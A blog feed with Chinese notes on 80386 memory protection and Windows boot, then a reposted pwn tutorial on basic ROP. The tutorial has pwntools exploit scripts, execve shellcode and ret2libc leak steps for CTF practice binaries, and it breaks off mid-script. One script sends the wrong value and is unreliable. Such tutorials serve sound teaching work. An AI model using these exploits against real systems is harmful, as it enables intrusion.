Table)。80386处理器设计成每个任务都有一个独立的LDT。它包含有每个任务私有的代码段、数据段和堆栈段的描述符，也包含该任务所使用的一些门描述符，如任务们和调用门描述符等</p><p>和GDTR直接指向内存地址不同，LDTR和CS、DS等段选择器一样只存放索引值，指向局部描述符表内存段对应的描述符在全局描述符表中的位置</p><p>随着任务的切换，只要改变LDTR的值，系统当前的局部描述符表LDT也随之切换，这样便于各项任务之间数据的隔离。但GDT并不随着任务的切换而切换</p><h2 id="80386的内存分页机制"><a href="#80386的内存分页机制" class="headerlink" title="80386的内存分页机制"></a>80386的内存分页机制</h2><p>在实模式下寻址的时候，“段寄存器+偏移地址”经过转换计算后得到的地址就是“物理地址”，也就是在物理内存中的实际地址</p><p>而保护模式下，“段寄存器+偏移地址”转换后的地址称为“线性地址”而不是“物理地址”。</p><h4 id="为什么会有内存分页机制？"><a href="#为什么会有内存分页机制？" class="headerlink" title="为什么会有内存分页机制？"></a>为什么会有内存分页机制？</h4><p>在单任务的DOS系统中，一个应用程序可以使用所有的空闲内存。程序退出后，操作系统回收所有的碎片内存并且合并成一个大块内存继续供下一个程序使用</p><p>内存合并过程中的一个极端情况是当系统中有多个TSR程序时，早装入内存的TSR被卸载后，后装入的TSR会留在内存的中间部位，把空闲内存隔成两个区域</p><p>这时应用程序使用的最大内存块只能是这两块内存中较大的一块，无法将它们合并使用</p><p>对于一个多任务的操作系统，内存的碎片化是不能容忍的。否则，经过一段时间后，即使空闲内存的总和很大，也可能出现任何一片内存都小到无法装入执行程序的地步，所以多任务操作系统中碎片内存的合并是个很重要的问题</p><h4 id="内存分页机制"><a href="#内存分页机制" class="headerlink" title="内存分页机制"></a>内存分页机制</h4><p>80386处理器的分页机制可以很好地解决这个问题。80386处理器把4KB大小的一块内存当做一“页”内存，每页物理内存可以根据“页目录”和“页表”，随意映射到不同的线性地址上。这样就可以将物理地址不连续的内存的映射连到一起</p><p>是否启用内存分页机制是由80386处理器新增的CR0寄存器中的位31（PG位）决定的，如果PG=0，则分页机制不启用，这时所有指令寻址的地址（线性地址）就是系统中实际的物理地址 。当PG=1的时候，80386处理器进入内存分页管理模式，所有的线性地址要经过页表的映射才得到最后的物理地址</p><p>不管在哪种模式下，所有寻址指令使用的都是线性地址，程序不用关心数据最后存放的物理内存</p><p>页表规定的不仅是地址的映射，同时还规定了页的访问属性，如是否可写、可读和可执行等。</p><p>页表可以指定一个页面并不真正映射到物理内存中。这样，访问这个页的指令会引发异常错误。这时，处理器会自动转移到页异常处理程序中去。操作系统可以在异常处理程序中将硬盘上的虚拟内存读到内存中并修改页表重新映射，然后重新执行引发异常的指令。利用这个机制可以在硬件层上支持虚拟内存的实现</p><h2 id="Windows的内存安排"><a href="#Windows的内存安排" class="headerlink" title="Windows的内存安排"></a>Windows的内存安排</h2><h3 id="虚拟内存安排"><a href="#虚拟内存安排" class="headerlink" title="虚拟内存安排"></a>虚拟内存安排</h3><p>Windows系统一般在硬盘上建立大小为物理内存两倍左右的交换文件用作虚拟内存</p><p>利用80386处理器的内存分页机制，交换文件的寻址上可以很方便地作为物理内存。只需要在真正调用的时候将其读入物理内存并同时修改线性地址映射到这块内存即可。同样道理，因为只是映射一个地址，所以被执行的程序也可以不必装入内存，只需要在页表种建立映射关系，真正运行到这段代码才调入内存</p><p>Windows是一个分时的多任务操作系统，CPU时间被分成一个个的时间片后分配给不同程序轮流使用。在A程序的时间片种，和这个程序执行无关的部分（B和C等其他程序的代码和数据）并不需要映射到线性地址中</p><blockquote><p>CPU只能看到线性地址（假的），每个程序拥有自己的线性地址（DLL除外）</p></blockquote><h3 id="WIN32编程中的重要概念"><a href="#WIN32编程中的重要概念" class="headerlink" title="WIN32编程中的重要概念"></a>WIN32编程中的重要概念</h3><ul><li>每个应用程序都有自己的4GB的寻址空间，该空间可存放操作系统、系统DLL和用户DLL的代码，它们之中有各种函数供应用程序调用。再除去其它的一些空间，余下的是应用程序的代码、数据和可以分配的地址空间</li><li>不同应用程序的线性地址空间是隔离的，虽然它们在物理内存种同时存在，但在某个程序所属的时间片中，其他应用程序的代码和数据没有被映射到可寻址的线性地址中，所以是不可访问的。所以从编程的角度来看，程序可以使用私有的4GB寻址空间</li><li>DLL程序没有自己的私有空间，它们总是被映射到其它应用程序的地址空间中，当做其它应用程序的一部分运行。是为了其它程序调用</li></ul><h3 id="从WIN32汇编的角度看内存寻址"><a href="#从WIN32汇编的角度看内存寻址" class="headerlink" title="从WIN32汇编的角度看内存寻址"></a>从WIN32汇编的角度看内存寻址</h3><p>如果把描述符表以及页表等内容交给用户程序管理是很不安全的。任何权限上开放引发的安全问题都是很严重的，如Windows9X中的中断描述符表是可写的，CIH病毒可利用它将自己的权限</p><p>Windows为用户程序的代码段、数据段和堆栈段全部预定义好了段描述符。这些段的起始地址为0，限长为ffffffff，所以用它们可以直接寻址全部的4GB地址空间</p><p>程序开始执行的时候，CS，DS，ES和SS都已经指向了正确的描述符，在整个程序的生命周期内，程序员不必改动这些段寄存器，也不必关心它们的值究竟是多少（也无法更改），所以整个程序可以不用出现段寄存器的身影</p><h2 id="实模式下的中断或异常处理"><a href="#实模式下的中断或异常处理" class="headerlink" title="实模式下的中断或异常处理"></a>实模式下的中断或异常处理</h2><p>实模式下的中断和异常服务程序地址存放在中断向量表中</p><p>中断向量表位于物理内存中，每个中断向量表是一个xxxxx:yyyy格式的地址，占用4字节</p><p>当发生n号异常或n号中断，或者执行到int n指令的时候，CPU首先到内存nx4的地方去取出服务程序的地址aaaa:bbbb</p><p>然后将标志寄存器、中断时的CS和IP压入堆栈，接着转移到aaaa:bbbb处执行</p><h2 id="保护模式下的中断或异常处理"><a href="#保护模式下的中断或异常处理" class="headerlink" title="保护模式下的中断或异常处理"></a>保护模式下的中断或异常处理</h2><p>保护模式下，中断或异常处理往往从用户代码切换到操作系统代码中执行。由于保护模式下的代码有优先级之分，因此出现了从优先级低的应用程序转移到优先级高的系统代码中的问题，如果优先级低的代码能够任意调用优先级高的代码，就相当于拥有了高优先级代码的权限。为了使高优先级的代码能够安全地被低优先级的代码调用，保护模式下增加了“门”的概念</p><p>“门”指向某个优先级高的程序所规定的入口点，所有优先级低的程序调用优先级高的程序只能通过门重定向，进入门所规定的入口点。这样可以避免低级别的代码从任意位置进入优先级高的程序的问题。保护模式下的中断和异常等服务程序也要从“门”进入，80386的门分为中断门、自陷门和任务门几种</p><p>保护模式下把所有的中断描述符放在一起组成“中断描述表IDT”。为此80386处理器引入了一个新的48位寄存器IDTR。IDTR的高32位指定了IDT在内存中的基址（线性地址），低16位指定了IDT的长度，相当于指定了可以支持的中断数量</p><p>保护模式下发生异常或中断时，处理器先根据IDTR寄存器得到中断描述符的地址，然后取出n号中断/异常的门描述符，再从描述符中得到中断服务程序的地址xxxx:yyyy，经过段地址转换后得到服务程序的32位线性地址并转移后执行</p><p>在Windows中，操作系统使用动态链接库来代替中断服务程序提供系统功能，所以Win32汇编中int指令也就失去了存在的意义。其实那些调用API的指令原本是用int指令实现的</p><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><h3 id="段的类型检查"><a href="#段的类型检查" class="headerlink" title="段的类型检查"></a>段的类型检查</h3><p>段的类型是由断描述符指定的，主要属性有是否可执行，是否可读和是否可写等</p><p>CS、DS和SS等段选择器是否能装入某种类型的段描述符是有限制的。如不可执行的段不能装入CS；不可读的段不能装入DS与ES等数据段寄存器；不可写的段不能装入SS等</p><p>如果段类型检查通不过，则处理器会产生一般性保护异常或堆栈异常</p><h3 id="页的类型检查"><a href="#页的类型检查" class="headerlink" title="页的类型检查"></a>页的类型检查</h3><p>除了可以在段级别上指定整个段是否可读写外，在页表中也可以为每个页指定是否可写</p><p>对于特权级下的执行代码，所有的页都是可写的</p><p>但对于1、2和3级的代码，还要根据页表中的R/W项决定是否可写，企图对只读的页进行写操作会产生页异常</p><h3 id="访问数据时的级别检查"><a href="#访问数据时的级别检查" class="headerlink" title="访问数据时的级别检查"></a>访问数据时的级别检查</h3><p>优先级低的代码不能访问优先级高的数据段。80386的段描述符中有一个DPL域（描述符优先级），表示这个段可以被访问的最低优先级</p><p>而段选择器中含有RPL域（请求优先级），表示当前执行代码的优先级</p><p>只有DPL数值上大于或等于RPL值的时候，该段才是可以访问的，否则会产生一般性保护异常</p><h3 id="控制转移的检查"><a href="#控制转移的检查" class="headerlink" title="控制转移的检查"></a>控制转移的检查</h3><p>在处理中，有很多指令可以实现控制转移，如jmp、call、ret、int和iret等指令</p><p>但优先级低的代码不能随意转移到优先级高的代码中，所以遇到这些指令的时候，处理器要检查转移的目的位置是否合法</p><h3 id="指令集的检查"><a href="#指令集的检查" class="headerlink" title="指令集的检查"></a>指令集的检查</h3><p>有两类指令可以影响保护机制</p><p>第一类是改变GDT、LDT、IDT以及控制寄存器等关键寄存器的指令，称为特权指令</p><p>第二类是操作I/O端口的指令以及cli和sti等改变中断允许的指令，称为敏感指令</p><p>特权指令只能在优先级0上才能运行，而敏感指令取决于eflags寄存器中的IOPL位。只有IOPL位表示的优先级高于等于当前代码段的优先级时，指令才能执行</p><h3 id="I-O操作的保护"><a href="#I-O操作的保护" class="headerlink" title="I/O操作的保护"></a>I/O操作的保护</h3><p>I/O地址也是受保护的对象。因为通过I/O操作可以绕过系统对很多硬件进行控制</p><p>80386可以单独位I/O空间提供保护，每个任务有个TSS（任务状态段）来记录任务切换的信息</p><p>TSS中有个I/O允许位图，用来表示对应的I/O端口是否可以操作</p><h2 id="Windows7的启动过程"><a href="#Windows7的启动过程" class="headerlink" title="Windows7的启动过程"></a>Windows7的启动过程</h2><h3 id="开启电源"><a href="#开启电源" class="headerlink" title="开启电源"></a>开启电源</h3><p>计算系统将会进行加电自检(POST)。如果通过，之后BIOS会读取主引导记录(MBR：被标记为启动设备的硬盘的首扇区)，并传送被Windows7建立的控制编码给MBR</p><blockquote><p>注：硬盘的0磁道的第一个扇区称为MBR，它的大小是512字节，而这个区域可以分为两个部分。第一部分为pre-boot区（预启动区），占446字节；第二部分是Partition Table区（分区表），占66个字节，该区域相当于一个小程序，作用是判断哪个分区被标记为活动分区，然后去读取那个分区的启动区，并运行该区种的代码</p></blockquote><p>MBR他是不属于任何一个操作系统，也不能用操作系统提供的磁盘操作命令来读取它。但我们可以用ROM-BIOS种提供的INT 13H中断的2号功能读出该扇区的内容</p><h3 id="启动菜单生成"><a href="#启动菜单生成" class="headerlink" title="启动菜单生成"></a>启动菜单生成</h3><p>Windows启动管理器读取”启动配置数据存储”(Boot Confi guration Data store)中的信息。此信息包含已经被安装在计算机上的所有操作系统的配置信息。并且用以生成启动菜单</p><p>当你在启动菜单中选择下列动作时：</p><ul><li>如果选择的是Window7，Windows启动管理器(Windows Boot Manager)运行<code>%SystemRoot%\System32</code>文件夹中的<code>OS Loader——Winload.exe</code></li><li>如果选择的是自休眠状态恢复Windows7，那么启动管理器将装载<code>Winresume.exe</code>并恢复先前的使用环境</li><li>如果选择的是早期版本的Windows，启动管理器将定位系统安装所在的卷，并且加载Windows NT风格的早期OS loader(Ntldr.exe)，生成一个由boot.ini内容决定的启动菜单</li></ul><h3 id="核心文件加载及登录"><a href="#核心文件加载及登录" class="headerlink" title="核心文件加载及登录"></a>核心文件加载及登录</h3><p>Windows7启动时，加载其核心文件Ntoskrnl.exe和hal.dll，从注册表中读取设置并加载驱动程序</p><p>接下来将运行Windows会话管理器(smss.exe)并且启动Windows启动程序(Wininit.exe)，本地安全验证(Lsass.exe)与服务(Services.exe)进程，完成后就可以登录系统</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门（Basic-ROP）</title>
      <link href="/2020/02/16/pwn%E2%95%9A%CE%B4%E2%94%9C%E2%94%BC%C3%BA%C2%BFBasic-ROP%C3%BA%E2%8C%90/"/>
      <url>/2020/02/16/pwn%E2%95%9A%CE%B4%E2%94%9C%E2%94%BC%C3%BA%C2%BFBasic-ROP%C3%BA%E2%8C%90/</url>
      
        <content type="html"><![CDATA[<p>转载自：<a href="https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL</a></p><h1 id="Basic-ROP"><a href="#Basic-ROP" class="headerlink" title="Basic-ROP"></a>Basic-ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>没啥好说的，看过蒸米的就可以做出来了</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2text&apos;)</span><br><span class="line">sys_addr=0x804863A</span><br><span class="line">payload=&apos;a&apos;*112+p32(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>通过有一个复制的函数，会复制到 buf2 这个地方</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162875314-6f04e478-d8ce-4975-b1d7-502907400056.png" alt="image.png"></p><p>而且 buf2 所在的是 bss 段</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162983275-2c3a0d0b-dad5-4f15-a5d8-8e219efa3c7c.png" alt="image.png"></p><p>通过 gdb 查看 bss 段可执行，所以把只要把内容写到这个地方，然后返回地址跳转到 bss 段就可以执行 shellcode</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574163235157-20066c3b-fd85-44dd-afb4-59ec9d47ab72.png" alt="image.png"></p><p>掌握了一些 pwntools 的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcraft.sh()</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))</span><br><span class="line"><span class="keyword">print</span> shellcode.ljust(<span class="number">112</span>,<span class="string">'A'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>上面是给出的 exp 等价于下面的，可以发现 shellcraft.sh() 可以生成 shellcode</p><p>shellcode.ljust(112,’a’) 可以控制垃圾数据与 shellcode 合起来的长度为112</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./ret2shellcode&apos;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode+=&apos;a&apos;*(112-len(shellcode))</span><br><span class="line">print shellcode</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">sh.sendline(shellcode + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="sniperoj-pwn100-shellcode-x86-64："><a href="#sniperoj-pwn100-shellcode-x86-64：" class="headerlink" title="sniperoj-pwn100-shellcode-x86-64："></a>sniperoj-pwn100-shellcode-x86-64：</h2><p>23字节shellcode</p><p>“\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p><p>首先根据 gdb 确定偏移，然后把因为有个 leave 指令会破坏前面的，所以前面的填充为脏数据，然后加上返回地址占据的 8 位空间，确定在 buf_addr 后面 24+8 填充 shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./shellcode&apos;)</span><br><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">sh.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = sh.recvuntil(&apos;]&apos;, drop=True)</span><br><span class="line">buf_addr = int(buf_addr, 16)</span><br><span class="line">payload = &apos;b&apos; * 24 + p64(buf_addr + 32) + shellcode_x64</span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscall 即控制程序执行系统调用来获取 shell</p><p>关于系统调用的知识：</p><blockquote><p><strong>Linux 的系统调用通过 int 80h 实现</strong>，用系统调用号来区分入口函数</p><p><strong>应用程序调用系统调用的过程是：</strong></p><p>1、把<strong>系统调用的编号存入 EAX</strong></p><p>2、把<strong>函数参数存入其它通用寄存器</strong></p><p>3、<strong>触发 0x80 号中断</strong>（int 0x80）</p></blockquote><p>那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了</p><p>如果说想通过系统调用执行的是：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p><p>那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574326114023-1a1a7dd8-3b3b-4b26-b267-8ab853fc7a6e.png" alt="image.png"></p><p>得到 11，转换为 16 进制是 0xb，所以 eax 中应该存放 0xb</p><p>ebx 应该存放想要执行的 /bin/sh 的地址，还有两个参数设置为 0</p><p>所以现在需要做的就是让：</p><blockquote><p>eax=0xb</p><p>ebx=/bin/sh 的地址</p><p>ecx=0</p><p>edx=0</p></blockquote><p>只需要让栈顶的值是 0xb 然后可以通过 pop eax 达到目的</p><p>要用：<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> 来查找</p><p>使用命令找到 pop eax：<code>ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335064586-620aa890-57e1-4427-8846-51990871c55c.png" alt="image.png"></p><p>类似的，通过这条命令寻找控制其他寄存器的地址，找到可以控制多个的！</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335389884-7affaef4-c92f-49e7-b6d6-c9ce091d9732.png" alt="image.png"></p><p>同时使用：<code>ROPgadget --binary rop --string &#39;/bin/sh&#39;</code> 找到 ‘/bin/sh’ 字符串在什么地方</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335469653-97f966c2-e116-4976-842a-adffcaefd70a.png" alt="image.png"></p><p>以及需要的 int 0x80：<code>ROPgadget --binary rop --only &#39;int&#39;</code></p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335607223-0e92b707-49c5-4e31-9bbf-fcb7a4764a6e.png" alt="image.png"></p><p>有偏移的长度：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574336747696-914e4724-c8c3-4ba1-b65d-cb3a93459f68.png" alt="image.png"></p><p>最后写出 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""自己写的"""</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_addr)+p32(int_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">"""ctf-wiki上的"""</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"><span class="comment">#flat模块能将pattern字符串和地址结合并且转为字节模式</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><p>控制程序执行 libc 中的参数，通常是返回到某个函数的 plt 处，或者某个函数的具体位置（函数对应 got 表项的内容），一般情况会选择执行 system(‘/bin/sh’)</p><p>看第一个程序：</p><p>得到偏移：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574403535178-184d2107-b762-47bd-9dda-d629e74d4483.png" alt="image.png"></p><p>同时找到：/bin/sh 与 system 的地址</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407070973-4b88be2e-6388-4c28-b14e-83ffa84124e0.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407137985-b2057cf8-fad6-4a89-80a8-355dc9f41fdc.png" alt="image.png"></p><p>构造 exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2libc1&apos;)</span><br><span class="line">bin_addr=0x8048720</span><br><span class="line">sys_addr=0x8048460</span><br><span class="line">payload=&apos;a&apos;*112 + p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(bin_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><p>这一个没有了 “/bin/sh” 字符串，需要通过 gets 函数写到一个可读可写的地方，通常会找 bss 段，然后去执行 /bin/sh </p><p>通过查找，可以找到的数据如下：</p><p>sys_addr=0x8048490</p><p>get_addr=0x8048460</p><p>bss_addr=0x804A080</p><p>通过这些数据可以写出 exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./ret2libc2&apos;)</span><br><span class="line">sys_addr=0x8048490</span><br><span class="line">get_addr=0x8048460</span><br><span class="line">bss_addr=0x804A080</span><br><span class="line">payload = &apos;a&apos;*112 +p32(get_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h3><p>没有 system 也没有 /bin/sh，需要使用 libc 中的 system 和 /bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc，从而知道其他函数的地址</p><p>获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址</p><p>总的来说：</p><p>1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）</p><p>2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system(‘/bin/sh’)</p><p>3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址</p><p>4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell</p><p>自己写的exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">elf=ELF(&apos;ret2libc3&apos;)</span><br><span class="line">p=process(&apos;./ret2libc3&apos;)</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got=elf.got[&apos;puts&apos;]</span><br><span class="line">start_addr = elf.symbols[&apos;_start&apos;]</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload1=&apos;A&apos;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(&quot;puts&quot;)</span><br><span class="line">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload2=&apos;A&apos;*112+p32(system_addr)+p32(1234)+p32(binsh_addr)</span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>dalao的 exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">start_addr = elf.symbols[&apos;_start&apos;]</span><br><span class="line">print &quot;[*]puts plt: &quot; + hex(puts_plt)</span><br><span class="line">print &quot;[*]puts got: &quot; + hex(puts_got)</span><br><span class="line">print &quot;[*]_start addr: &quot; + hex(start_addr)</span><br><span class="line">print &quot;[*]libc addr: &quot; + hex(libc.address)</span><br><span class="line">print &quot;--&quot; * 20</span><br><span class="line">print &quot;[*]sending payload1 to leak libc...&quot;</span><br><span class="line"></span><br><span class="line">payload = flat([&quot;A&quot; * 112, puts_plt, start_addr, puts_got])</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;Can you find it !?&quot;, payload)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">print &quot;[*]leak puts addr: &quot; + 